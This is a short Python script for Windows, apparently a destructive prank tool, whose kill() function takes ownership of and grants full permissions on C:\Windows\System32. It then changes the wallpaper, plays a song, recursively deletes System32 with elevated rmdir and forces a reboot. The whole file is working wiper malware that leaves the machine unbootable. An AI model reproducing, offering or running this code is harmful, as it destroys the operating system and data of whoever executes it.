import os
from playsound import playsound
import ctypes
import win32com.shell.shell as shell


__sound_file = os.path.normpath(r"./files/where_is_my_mind_piano.mp3")
__project_root = os.path.dirname(os.path.dirname(__file__))
__wallpaper_file = os.path.normpath(__project_root + r"/src/files/where_is_my_mind.png")
__kill_path = "C:\Windows\System32"


def __set_wallpaper():
    ctypes.windll.user32.SystemParametersInfoW(20, 0, __wallpaper_file , 0)


def __play_song():
    playsound(__sound_file)


def __change_windows_files_and_folders_ownership():
    command = f"takeown /f {__kill_path} /r /d y"
    shell.ShellExecuteEx(lpVerb='runas', lpFile='cmd.exe', lpParameters='/C '+ command)


def __change_windows_files_and_folders_permissions():
    command = f"icacls {__kill_path} /Q /C /T /grant:r {os.environ.get('USERNAME')}:(OI)(CI)F"
    shell.ShellExecuteEx(lpVerb='runas', lpFile='cmd.exe', lpParameters='/C '+ command)


def __delete_all():
    command = f"rmdir /S /Q {__kill_path}"
    shell.ShellExecuteEx(lpVerb='runas', lpFile='cmd.exe', lpParameters='/C '+ command)


def __shutdown():
    command = "shutdown /r /t 1"
    os.system(command)


def kill():
    __change_windows_files_and_folders_ownership()
    __change_windows_files_and_folders_permissions()
    __set_wallpaper()
    __play_song()
    __delete_all()
    __shutdown()